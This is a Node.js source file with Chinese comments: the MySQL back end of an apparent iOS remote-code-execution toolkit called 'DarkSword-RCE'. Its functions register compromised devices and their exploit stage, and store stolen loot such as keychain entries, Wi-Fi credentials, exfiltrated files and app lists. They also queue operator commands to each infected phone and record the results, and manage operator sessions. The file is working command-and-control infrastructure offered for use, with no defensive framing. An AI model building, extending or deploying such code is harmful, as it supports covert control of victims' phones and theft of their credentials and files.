/**
 * DarkSword-RCE MySQL 数据库模块
 * 
 * 功能：
 * - MySQL 5.7+ 连接池管理
 * - 设备、Loot、命令的 CRUD 操作
 * - Session 管理
 * - 日志记录
 */

'use strict';

const mysql = require('mysql2/promise');

// ── MySQL 连接池 ─────────────────────────────────────────────────────────────
let pool = null;

/**
 * 初始化 MySQL 连接池
 * @param {Object} config - 数据库配置
 */
async function initDB(config) {
  pool = mysql.createPool({
    host: config.host || 'localhost',
    port: config.port || 3306,
    user: config.user,
    password: config.password,
    database: config.database || 'darksword_rce',
    waitForConnections: true,
    connectionLimit: 10,
    queueLimit: 0,
    charset: 'utf8mb4',
    timezone: '+00:00', // UTC
  });

  // 测试连接
  try {
    const conn = await pool.getConnection();
    console.log('[MySQL] 数据库连接成功');
    conn.release();
  } catch (error) {
    console.error('[MySQL] 数据库连接失败:', error.message);
    throw error;
  }

  return pool;
}

/**
 * 关闭数据库连接池
 */
async function closeDB() {
  if (pool) {
    await pool.end();
    console.log('[MySQL] 数据库连接已关闭');
  }
}

// ── 设备管理 ─────────────────────────────────────────────────────────────────

/**
 * 插入或更新设备信息
 */
async function upsertDevice(deviceData) {
  const {
    deviceId, deviceName, model, iosVersion, ua, ip,
    stage, execStatus, extra
  } = deviceData;

  const sql = `
    INSERT INTO devices (
      device_id, device_name, model, ios_version, ua, ip,
      stage, exec_status, extra, first_seen_at, last_seen_at
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, NOW(), NOW())
    ON DUPLICATE KEY UPDATE
      device_name = VALUES(device_name),
      model = VALUES(model),
      ios_version = VALUES(ios_version),
      ua = VALUES(ua),
      ip = VALUES(ip),
      stage = VALUES(stage),
      exec_status = VALUES(exec_status),
      extra = VALUES(extra),
      last_seen_at = NOW()
  `;

  const extraJson = extra ? JSON.stringify(extra) : null;
  
  await pool.execute(sql, [
    deviceId, deviceName, model, iosVersion, ua, ip,
    stage, execStatus, extraJson
  ]);

  return await getDevice(deviceId);
}

/**
 * 获取单个设备信息
 */
async function getDevice(deviceId) {
  const [rows] = await pool.execute(
    'SELECT * FROM devices WHERE device_id = ?',
    [deviceId]
  );
  
  if (rows.length === 0) return null;
  
  const device = rows[0];
  if (device.extra && typeof device.extra === 'string') {
    device.extra = JSON.parse(device.extra);
  }
  
  return device;
}

/**
 * 获取所有设备列表
 */
async function getAllDevices() {
  const [rows] = await pool.execute(
    'SELECT * FROM devices ORDER BY last_seen_at DESC'
  );
  
  return rows.map(device => {
    if (device.extra && typeof device.extra === 'string') {
      device.extra = JSON.parse(device.extra);
    }
    return device;
  });
}

/**
 * 删除设备（级联删除相关数据）
 */
async function deleteDevice(deviceId) {
  const [result] = await pool.execute(
    'DELETE FROM devices WHERE device_id = ?',
    [deviceId]
  );
  
  return result.affectedRows > 0;
}

// ── Loot 数据管理 ────────────────────────────────────────────────────────────

/**
 * 添加 Loot 数据
 */
async function addLootData(deviceId, lootType, data) {
  const sql = `
    INSERT INTO loot_data (device_id, loot_type, data_json)
    VALUES (?, ?, ?)
  `;
  
  await pool.execute(sql, [deviceId, lootType, JSON.stringify(data)]);
}

/**
 * 添加 Loot 文件记录
 */
async function addLootFile(deviceId, filename, fileSize, filePath, saved) {
  const sql = `
    INSERT INTO loot_files (device_id, filename, file_size, file_path, saved)
    VALUES (?, ?, ?, ?, ?)
  `;
  
  await pool.execute(sql, [deviceId, filename, fileSize, filePath, saved ? 1 : 0]);
}

/**
 * 获取设备的所有 Loot 数据
 */
async function getDeviceLoot(deviceId) {
  // 获取 Loot 数据
  const [lootRows] = await pool.execute(
    'SELECT * FROM loot_data WHERE device_id = ? ORDER BY created_at DESC',
    [deviceId]
  );
  
  // 获取文件列表
  const [fileRows] = await pool.execute(
    'SELECT * FROM loot_files WHERE device_id = ? ORDER BY created_at DESC',
    [deviceId]
  );
  
  // 整理数据格式（兼容旧格式）
  const loot = {
    keychain: [],
    wifi: [],
    files: fileRows.map(f => ({
      name: f.filename,
      size: f.file_size,
      ts: f.created_at.getTime(),
      saved: f.saved === 1,
      path: f.file_path
    })),
    apps: [],
    info: {}
  };
  
  // 按类型分组
  for (const row of lootRows) {
    const data = JSON.parse(row.data_json);
    
    if (row.loot_type === 'keychain' && Array.isArray(data)) {
      loot.keychain.push(...data);
    } else if (row.loot_type === 'wifi' && Array.isArray(data)) {
      loot.wifi.push(...data);
    } else if (row.loot_type === 'apps' && Array.isArray(data)) {
      loot.apps = data; // 替换而非追加
    } else if (row.loot_type === 'info' && typeof data === 'object') {
      Object.assign(loot.info, data);
    }
  }
  
  return loot;
}

// ── 命令管理 ─────────────────────────────────────────────────────────────────

/**
 * 添加命令到队列
 */
async function addCommand(cmdId, deviceId, cmdType, cmdArgs, issuedBy = 'admin') {
  const sql = `
    INSERT INTO cmd_queue (cmd_id, device_id, cmd_type, cmd_args, issued_by)
    VALUES (?, ?, ?, ?, ?)
  `;
  
  const argsJson = cmdArgs ? JSON.stringify(cmdArgs) : null;
  await pool.execute(sql, [cmdId, deviceId, cmdType, argsJson, issuedBy]);
}

/**
 * 获取设备的待执行命令
 */
async function getPendingCommands(deviceId) {
  const sql = `
    SELECT q.cmd_id AS cmdId, q.cmd_type AS type, q.cmd_args AS args
    FROM cmd_queue q
    LEFT JOIN cmd_results r ON q.cmd_id = r.cmd_id
    WHERE q.device_id = ? AND r.cmd_id IS NULL
    ORDER BY q.created_at ASC
  `;
  
  const [rows] = await pool.execute(sql, [deviceId]);
  
  return rows.map(row => ({
    cmdId: row.cmdId,
    type: row.type,
    args: row.args ? JSON.parse(row.args) : {}
  }));
}

/**
 * 保存命令执行结果
 */
async function saveCommandResult(cmdId, deviceId, cmdType, output, status, bridgeReady, reason) {
  const sql = `
    INSERT INTO cmd_results (cmd_id, device_id, cmd_type, output, status, bridge_ready, reason)
    VALUES (?, ?, ?, ?, ?, ?, ?)
  `;
  
  await pool.execute(sql, [
    cmdId, deviceId, cmdType, output, status,
    bridgeReady !== undefined ? (bridgeReady ? 1 : 0) : null,
    reason !== undefined ? reason : null
  ]);
  
  // 更新命令队列状态
  await pool.execute(
    'UPDATE cmd_queue SET status = ? WHERE cmd_id = ?',
    [status === 'done' ? 'completed' : 'failed', cmdId]
  );
}

/**
 * 获取设备的命令历史
 */
async function getCommandHistory(deviceId, limit = 50) {
  const sql = `
    SELECT r.*, q.issued_by, q.created_at AS issued_at
    FROM cmd_results r
    JOIN cmd_queue q ON r.cmd_id = q.cmd_id
    WHERE r.device_id = ?
    ORDER BY r.created_at DESC
    LIMIT ?
  `;
  
  const [rows] = await pool.execute(sql, [deviceId, limit]);
  return rows;
}

// ── Session 管理 ─────────────────────────────────────────────────────────────

/**
 * 创建 Session
 */
async function createSession(sessionId, username, csrfToken, ttlMs) {
  const expiresAt = new Date(Date.now() + ttlMs);
  
  const sql = `
    INSERT INTO sessions (session_id, username, csrf_token, expires_at)
    VALUES (?, ?, ?, ?)
  `;
  
  await pool.execute(sql, [sessionId, username, csrfToken, expiresAt]);
}

/**
 * 获取 Session
 */
async function getSession(sessionId) {
  const [rows] = await pool.execute(
    'SELECT * FROM sessions WHERE session_id = ? AND expires_at > NOW()',
    [sessionId]
  );
  
  return rows.length > 0 ? rows[0] : null;
}

/**
 * 删除 Session（登出）
 */
async function deleteSession(sessionId) {
  await pool.execute('DELETE FROM sessions WHERE session_id = ?', [sessionId]);
}

/**
 * 清理过期 Session
 */
async function cleanupExpiredSessions() {
  const [result] = await pool.execute('DELETE FROM sessions WHERE expires_at < NOW()');
  return result.affectedRows;
}

// ── 日志管理 ─────────────────────────────────────────────────────────────────

/**
 * 记录系统日志
 */
async function logEvent(level, logType, message, deviceId = null, extra = null) {
  const sql = `
    INSERT INTO system_logs (log_level, log_type, device_id, message, extra)
    VALUES (?, ?, ?, ?, ?)
  `;
  
  const extraJson = extra ? JSON.stringify(extra) : null;
  await pool.execute(sql, [level, logType, deviceId, message, extraJson]);
}

/**
 * 获取最近日志
 */
async function getRecentLogs(limit = 100, logType = null) {
  // 白名单验证 logType
  const allowedTypes = ['auth', 'device', 'cmd', 'loot', 'system'];
  
  let sql = 'SELECT * FROM system_logs';
  const params = [];
  
  if (logType) {
    if (!allowedTypes.includes(logType)) {
      throw new Error('Invalid log type');
    }
    sql += ' WHERE log_type = ?';
    params.push(logType);
  }
  
  sql += ' ORDER BY created_at DESC LIMIT ?';
  params.push(limit);
  
  const [rows] = await pool.execute(sql, params);
  return rows;
}

// ── 统计查询 ─────────────────────────────────────────────────────────────────

/**
 * 获取设备统计
 */
async function getDeviceStats() {
  const [rows] = await pool.execute('SELECT * FROM v_device_stats');
  return rows[0];
}

/**
 * 获取 Loot 统计
 */
async function getLootStats(deviceId) {
  const [rows] = await pool.execute(
    'SELECT * FROM v_loot_stats WHERE device_id = ?',
    [deviceId]
  );
  return rows[0] || {
    keychain_count: 0,
    wifi_count: 0,
    info_count: 0,
    file_count: 0
  };
}

// ── 导出 ─────────────────────────────────────────────────────────────────────

module.exports = {
  // 连接管理
  initDB,
  closeDB,
  
  // 设备管理
  upsertDevice,
  getDevice,
  getAllDevices,
  deleteDevice,
  
  // Loot 管理
  addLootData,
  addLootFile,
  getDeviceLoot,
  
  // 命令管理
  addCommand,
  getPendingCommands,
  saveCommandResult,
  getCommandHistory,
  
  // Session 管理
  createSession,
  getSession,
  deleteSession,
  cleanupExpiredSessions,
  
  // 日志管理
  logEvent,
  getRecentLogs,
  
  // 统计查询
  getDeviceStats,
  getLootStats,

  // 原始连接池（供高级查询使用）
  getPool: () => pool,
  query: async (sql, params) => {
    if (!pool) throw new Error('Database not initialized');
    return pool.execute(sql, params);
  },
};